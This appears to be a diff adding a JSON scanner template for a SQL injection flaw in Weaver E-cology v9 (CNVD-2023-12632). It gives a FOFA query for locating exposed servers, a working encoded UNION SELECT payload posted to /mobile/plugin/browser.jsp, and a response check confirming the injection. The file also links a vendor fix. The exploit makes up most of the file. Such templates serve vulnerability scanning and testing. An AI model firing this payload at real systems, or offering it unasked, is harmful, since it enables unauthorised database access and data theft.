@@ -1,0 +1,39 @@
+{
+  "product": "泛微E-cology",
+  "vul_name": "泛微E-cology v9 browser.jsp 存在SQL注入",
+  "type": "SQL注入",
+  "vul_id": [
+    "CNVD-2023-12632",
+    "QVD-2023-5012 "
+  ],
+  "level": 3,
+  "vul_desc": "由于泛微e-cology9中对用户前台输入的数据未做校验，可以通过构造恶意的数据包导致SQL注入漏洞，进一步获取敏感数据。",
+  "version": "泛微e-cology V9<10.56",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"泛微-协同商务系统\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_50854662/article/details/129992329",
+  "fix": [
+    "官方修复方案：https://www.weaver.com.cn/cs/securityDownload.asp"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/mobile/plugin/browser.jsp",
+      "data": "isDis=1&browserTypeId=269&keyword=a%252527%252520union%252520select%2525201%25252C%252527%252527%25252B%252528SELECT%252520MD5%252528123456%252529%252529%25252B%252527"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
